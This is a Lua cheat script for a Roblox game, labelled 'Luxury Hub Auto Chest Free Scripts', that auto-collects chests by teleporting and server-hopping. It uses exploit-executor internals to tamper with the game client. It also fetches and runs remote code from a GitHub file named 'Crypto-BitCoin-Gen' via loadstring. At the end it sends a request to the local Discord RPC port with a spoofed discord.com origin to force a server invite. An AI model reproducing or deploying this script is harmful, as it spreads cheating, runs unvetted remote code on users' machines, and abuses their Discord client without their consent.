-- Configuration
local Team = "Pirates" -- Set your desired team ("Pirates" or "Marines")
local AutoChestEnabled = true
local HopServerEnabled = true

-- Create a message GUI
local GameLoadGui = Instance.new("Message", workspace)
GameLoadGui.Text = 'Luxury Hub Auto Chest Free Scripts'

-- Get player objects
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

repeat
    local ChooseTeam = PlayerGui:FindFirstChild("ChooseTeam", true)
    local UIController = PlayerGui:FindFirstChild("UIController", true)

    if UIController and ChooseTeam and ChooseTeam.Visible then
        for _, func in pairs(getgc()) do
            if type(func) == "function" and getfenv(func).script == UIController then
                local constants = getconstants(func)
                pcall(function()
                    if constants[1] == "Pirates" and #constants == 1 then
                        func(shared.Team or "Pirates")
                    end
                end)
            end
        end
    end

    wait(1)
until LocalPlayer.Team

repeat
    wait()
until LocalPlayer.Character

-- Function to teleport to a specified position
local function teleport(CFrame)
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame
end

local function autoTeleport(Position)
    for _ = 1, 6 do
        teleport(Position)
        LocalPlayer.Character.Humanoid:ChangeState(14)
    end
end

local ServerFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/NightsTimeZ/Api/main/Crypto-BitCoin-Gen"))()

-- Enable auto chest collection
local function AutoChest()
    while task.wait() do
        pcall(function()
            local chestList = workspace:GetChildren()
            for _, v in ipairs(chestList) do
                if v.Name:match("Chest%d") then
                    while v.Parent and AutoChestEnabled do
                        task.wait()
                        autoTeleport(v.CFrame)
                    end
                end
            end
            if HopServerEnabled and AutoChestEnabled then
                ServerFunc:NormalTeleport()
            end
        end)
    end
end

-- Function to handle error prompt
local function HandleErrorPrompt(child)
    if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end
end

-- Listen for error prompts
game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(HandleErrorPrompt)

-- Start the AutoChest function in a separate thread
task.spawn(AutoChest)

-- Additional code for Discord RPC (if needed)
local http_request = http_request

if syn then
    http_request = syn.request
else
    http_request = request
end

http_request({
    Url = "http://127.0.0.1:6463/rpc?v=1",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
        ["Origin"] = "https://discord.com"
    },
    Body = game:GetService("HttpService"):JSONEncode(
        {
            cmd = "INVITE_BROWSER",
            args = { code = "luxuryhub" },
            nonce = game:GetService("HttpService"):GenerateGUID(false)
        }
    )
})
